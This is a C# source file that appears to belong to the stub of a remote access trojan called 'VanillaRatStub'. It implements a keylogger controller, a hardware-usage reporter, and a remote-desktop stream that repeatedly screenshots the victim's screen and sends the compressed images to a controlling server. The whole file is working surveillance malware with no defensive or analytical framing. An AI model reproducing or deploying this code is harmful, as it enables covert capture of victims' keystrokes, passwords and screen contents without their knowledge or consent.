using StreamLibrary;
using StreamLibrary.UnsafeCodecs;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace VanillaRatStub.InformationHelpers
{
    public static class KeyloggerStream
    {
        public static bool KeyloggerActive { get; set; }
        public static Keylogger K = new Keylogger();
        private static Thread KeyloggerThread = new Thread(StartKeylogger);

        [SecurityPermissionAttribute(SecurityAction.Demand, ControlThread = true)]
        public static void Start()
        {
            if (!KeyloggerActive)
            {
                KeyloggerActive = true;
                Keylogger.SendKeys = true;
                try
                {
                    KeyloggerThread.Start();
                }
                catch { }
            }
        }

        [SecurityPermissionAttribute(SecurityAction.Demand, ControlThread = true)]
        public static void Stop()
        {
            if (KeyloggerActive)
            {
                KeyloggerActive = false;
                Keylogger.SendKeys = false;
                try
                {
                    KeyloggerThread.Abort();
                    KeyloggerThread = new Thread(StartKeylogger);
                }
                catch { }
            }
        }

        private static void StartKeylogger()
        {
            K.InitKeylogger();
        }
    }

    public static class HardwareUsageStream
    {
        public static bool HardwareUsageActive { get; set; }
        private static Thread HardwareUsageThread = new Thread(StartHardwareUsage);

        [SecurityPermissionAttribute(SecurityAction.Demand, ControlThread = true)]
        public static void Start()
        {
            if (!HardwareUsageActive)
            {
                HardwareUsageActive = true;
                try
                {
                    HardwareUsageThread.Start();
                }
                catch { }
            }
        }

        [SecurityPermissionAttribute(SecurityAction.Demand, ControlThread = true)]
        public static void Stop()
        {
            if (HardwareUsageActive)
            {
                HardwareUsageActive = false;
                try
                {
                    HardwareUsageThread.Abort();
                    HardwareUsageThread = new Thread(StartHardwareUsage);
                }
                catch { }
            }
        }

        public static void StartHardwareUsage()
        {
            PerformanceCounter PCCPU = new PerformanceCounter("Processor", "% Processor Time", "_Total");
            PerformanceCounter PCMEM = new PerformanceCounter("Memory", "Available MBytes");
            PerformanceCounter PCDISK = new PerformanceCounter("PhysicalDisk", "% Disk Time", "_Total");
            while (HardwareUsageActive)
            {
                string Values = "{" + PCCPU.NextValue() + "}[" + PCMEM.NextValue() + "]<" + PCDISK.NextValue() + ">";
                List<byte> ToSend = new List<byte>();
                ToSend.Add(10); //Hardware Usage Type
                ToSend.AddRange(Encoding.ASCII.GetBytes(Values));
                Networking.MainClient.Send(ToSend.ToArray());
                Thread.Sleep(500);
            }
        }
    }

    public static class RemoteDesktopStream
    {
        public static bool RemoteDesktopActive { get; set; }
        private static Thread RemoteDestkopThread = new Thread(StartRemoteDestkop);

        [DllImport("gdi32.dll", CharSet = CharSet.Unicode)]
        internal static extern IntPtr CreateDC(string lpszDriver, string lpszDevice, string lpszOutput,
            IntPtr lpInitData);

        [DllImport("gdi32.dll", EntryPoint = "BitBlt", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool BitBlt([In] IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight,
            [In] IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

        [DllImport("gdi32.dll")]
        internal static extern bool DeleteDC([In] IntPtr hdc);

        [SecurityPermissionAttribute(SecurityAction.Demand, ControlThread = true)]
        public static void Start()
        {
            if (!RemoteDesktopActive)
            {
                RemoteDesktopActive = true;
                try
                {
                    RemoteDestkopThread.Start();
                }
                catch { }
            }
        }

        [SecurityPermissionAttribute(SecurityAction.Demand, ControlThread = true)]
        public static void Stop()
        {
            if (RemoteDesktopActive)
            {
                RemoteDesktopActive = false;
                try
                {
                    RemoteDestkopThread.Abort();
                    RemoteDestkopThread = new Thread(StartRemoteDestkop);
                }
                catch { }
            }
        }

        private static void StartRemoteDestkop()
        {
            while (RemoteDesktopActive)
            {
                byte[] ImageBytes = null;
                IUnsafeCodec UC = new UnsafeStreamCodec(60);
                Bitmap Image = GetDesktopImage();
                int Width = Image.Width;
                int Height = Image.Height;
                BitmapData BD = GetDesktopImage().LockBits(new Rectangle(0, 0, Image.Width, Image.Height),
                    ImageLockMode.ReadWrite, Image.PixelFormat);
                using (MemoryStream MS = new MemoryStream())
                {
                    UC.CodeImage(BD.Scan0, new Rectangle(0, 0, Width, Height), new Size(Width, Height),
                        Image.PixelFormat, MS);
                    ImageBytes = MS.ToArray();
                }
                List<byte> ToSend = new List<byte>();
                ToSend.Add(0); //Image Type
                ToSend.AddRange(ImageBytes);
                Networking.MainClient.Send(ToSend.ToArray());
                Thread.Sleep(Convert.ToInt16(20));
            }
        }

        //Get image of desktop
        private static Bitmap GetDesktopImage()
        {
            Rectangle Bounds = Screen.PrimaryScreen.Bounds;
            Bitmap Screenshot = new Bitmap(Bounds.Width, Bounds.Height, PixelFormat.Format32bppPArgb);
            using (Graphics G = Graphics.FromImage(Screenshot))
            {
                IntPtr DestDeviceContext = G.GetHdc();
                IntPtr SrcDeviceContext = CreateDC("DISPLAY", null, null, IntPtr.Zero);
                BitBlt(DestDeviceContext, 0, 0, Bounds.Width, Bounds.Height, SrcDeviceContext, Bounds.X, Bounds.Y,
                    0x00CC0020);
                DeleteDC(SrcDeviceContext);
                G.ReleaseHdc(DestDeviceContext);
            }

            return Screenshot;
        }
    }
}